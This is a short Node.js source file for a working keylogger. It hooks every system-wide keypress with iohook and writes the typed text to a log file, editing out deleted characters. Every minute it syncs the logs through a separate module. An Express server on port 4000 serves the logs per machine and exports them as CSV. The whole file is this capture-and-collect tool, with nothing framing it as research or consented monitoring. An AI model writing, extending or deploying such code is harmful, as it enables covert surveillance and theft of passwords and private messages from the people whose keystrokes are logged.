const ioHook = require("iohook");
const fs = require("fs");
const cron = require("node-cron");
const synchronizedData = require("./dbs/synchronized_data");
const express = require("express");
const app = express();
app.use(express.urlencoded({ extended: true }));

// keyboard listener
let inputListenerString = "";
ioHook.on("keypress", (event) => {
  if (event.rawcode === 13) inputListenerString += "\n";
  else if (event.rawcode === 8 || event.rawcode === 46)
    inputListenerString = inputListenerString.slice(0, -1);
  else inputListenerString += String.fromCharCode(event.rawcode);
  fs.writeFileSync("./log/keyboard_log.txt", inputListenerString);
});

ioHook.start();

// cron schedule
cron.schedule("0-59 * * * *", () => {
  console.log("sync data");
  synchronizedData.sync();
});

app.get("/", (req, res) => {
  res.json("Init app");
});

// export-csv
app.get("/export-csv", (req, res) => synchronizedData.exportData(req, res));

// get logs
app.get("/logs", (req, res) => synchronizedData.getAllLog(req, res));
// get logs mac-address
app.get("/logs/:uid", (req, res) => synchronizedData.getAllLog(req, res));

app.listen(4000, () => {
  console.log("App running on port 4000");
});
